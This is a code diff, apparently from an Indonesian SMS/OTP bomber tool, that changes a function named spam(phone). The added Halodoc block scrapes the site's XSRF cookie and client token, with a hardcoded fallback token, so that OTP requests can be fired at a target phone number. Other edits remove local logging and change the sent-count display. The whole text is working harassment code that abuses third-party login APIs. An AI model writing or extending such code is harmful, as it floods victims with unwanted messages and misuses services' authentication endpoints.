@@ -38,6 +38,22 @@ def spam(phone):
         el = _x(phone)
         for name, url, h, b in el:
             h["User-Agent"] = _u()
+            
+            # Halodoc: ambil token segar
+            if b.pop("_halodoc", False):
+                try:
+                    import requests as _rr, re
+                    s = _rr.Session()
+                    s.headers.update({"User-Agent": _u()})
+                    r = s.get("https://www.halodoc.com/login", timeout=10)
+                    xsrf = s.cookies.get("XSRF-TOKEN", "")
+                    h["X-XSRF-TOKEN"] = xsrf
+                    match = re.search(r'clientToken["\']?\s*[=:]\s*["\']([a-f0-9]+)["\']', r.text)
+                    ct = match.group(1) if match else "5a46f557bbabb198d46f00119c958ad0ddd25880508c1cc62337a8adac661af9"
+                    url = f"https://www.halodoc.com/magneto-api/v2/users/authentication/otp/requests?clientToken={ct}"
+                except:
+                    pass
+            
             status = "?"
             try:
                 import requests as _rr
@@ -52,8 +68,6 @@ def spam(phone):
                 else:
                     failed.append(name)
                     status = f"{R}✗{N}"
-                with open(os.path.expanduser("~/umambo/log"), "a") as f:
-                    f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {name} {s}\n")
             except:
                 failed.append(name)
                 status = f"{R}✗{N}"
@@ -66,5 +80,5 @@ def spam(phone):
     if sent: print(f"  {G}✓ Terkirim ({len(sent)}): {', '.join(sent)}{N}")
     if blocked: print(f"  {Y}⊗ Diblokir ({len(blocked)}): {', '.join(blocked)}{N}")
     if failed: print(f"  {R}✗ Gagal ({len(failed)}): {', '.join(failed)}{N}")
-    print(f"\n  {C}Total: {len(sent)}/{len(sent)+len(blocked)+len(failed)} terkirim{N}")
+    print(f"\n  {C}Total: {len(sent)}/{len(el)*loop} terkirim{N}")
     input(f"\n  {W}[Enter] Kembali...{N}")
